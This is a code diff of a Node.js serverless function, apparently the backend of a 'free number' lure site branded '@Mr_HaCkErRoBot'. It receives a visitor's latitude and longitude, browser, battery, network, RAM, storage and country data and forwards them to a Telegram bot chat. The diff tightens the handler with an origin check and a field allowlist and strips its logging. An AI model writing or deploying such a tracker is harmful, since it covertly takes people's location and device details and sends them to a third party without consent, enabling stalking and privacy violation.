@@ -1,52 +1,64 @@
+
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const formidable = require('formidable');
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
+  const allowedOrigin = 'https://free-number1.vercel.app'; // <- دامنه‌ی خودت
 
-  if (!botToken) {
-    console.error('Bot token not configured.');
-    return res.status(500).json({ ok: false, error: 'Bot token not configured.' });
+  // بررسی Origin
+  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
+    return res.status(403).json({ ok: false, error: 'Invalid origin' });
   }
 
   if (req.method !== 'POST') {
-    console.error('Method not allowed:', req.method);
-    return res.status(405).json({ ok: false, error: 'Method not allowed.' });
+    return res.status(405).json({ ok: false, error: 'Method not allowed' });
   }
 
   const form = new formidable.IncomingForm();
+
   form.parse(req, async (err, fields, files) => {
     if (err) {
-      console.error('Error parsing form:', err);
       return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
     }
 
-    const chatId = fields.chat_id;
-    const latitude = fields.latitude;
-    const longitude = fields.longitude;
-    const userAgent = fields.user_agent;
-    const timezone = fields.timezone;
-    const batteryLevel = fields.battery_level;
-    const batteryCharging = fields.battery_charging;
-    const networkType = fields.network_type;
-    const networkSpeed = fields.network_speed;
-    const ram = fields.ram;
-    const storage = fields.storage;
-    const countryCode = fields.country_code;
+    const allowedFields = [
+      'chat_id', 'latitude', 'longitude', 'user_agent', 'timezone',
+      'battery_level', 'battery_charging', 'network_type', 'network_speed',
+      'ram', 'storage', 'country_code'
+    ];
+
+    for (const field in fields) {
+      if (!allowedFields.includes(field)) {
+        return res.status(400).json({ ok: false, error: 'Invalid input field: ' + field });
+      }
+    }
+
+    const {
+      chat_id: chatId,
+      latitude,
+      longitude,
+      user_agent: userAgent,
+      timezone,
+      battery_level: batteryLevel,
+      battery_charging: batteryCharging,
+      network_type: networkType,
+      network_speed: networkSpeed,
+      ram,
+      storage,
+      country_code: countryCode
+    } = fields;
 
     if (!chatId || !latitude || !longitude) {
-      console.error('Missing required parameters');
       return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
     }
 
     try {
       const now = new Date();
       const dateTime = now.toLocaleString();
-      
-      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮
-⚡Powered by :- @Mr_HaCkErRoBot
-╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
+
+      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
         `*📌 New Data Received:*\n\n` +
         `*📍 Latitude:* ${latitude}\n` +
         `*📍 Longitude:* ${longitude}\n` +
@@ -61,56 +73,30 @@ module.exports = async (req, res) => {
         `*💽 Storage:* ${storage || 'Unknown'}\n` +
         `*🔒 Permission:* Denied`;
 
-      // First send location
-      const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
-      const locationData = {
-        chat_id: chatId,
-        latitude: latitude,
-        longitude: longitude
-      };
-
-      const locationResponse = await fetch(locationUrl, {
+      const locationRes = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: new URLSearchParams(locationData)
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
       });
 
-      const locationResult = await locationResponse.json();
-
-      if (!locationResult.ok) {
-        console.error('Telegram API error:', locationResult);
-        return res.status(500).json({ ok: false, error: locationResult.description });
+      const locResult = await locationRes.json();
+      if (!locResult.ok) {
+        return res.status(500).json({ ok: false, error: locResult.description });
       }
 
-      // Then send the additional information as a message
-      const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const messageData = {
-        chat_id: chatId,
-        text: messageText,
-        parse_mode: 'Markdown'
-      };
-
-      const messageResponse = await fetch(messageUrl, {
+      const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: new URLSearchParams(messageData)
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
       });
 
-      const messageResult = await messageResponse.json();
-
-      if (!messageResult.ok) {
-        console.error('Telegram API error:', messageResult);
-        return res.status(500).json({ ok: false, error: messageResult.description });
+      const msgResult = await messageRes.json();
+      if (!msgResult.ok) {
+        return res.status(500).json({ ok: false, error: msgResult.description });
       }
 
-      console.log('Location and data sent successfully');
       return res.status(200).json({ ok: true });
     } catch (error) {
-      console.error('Error in sendMedia:', error);
       return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
     }
   });
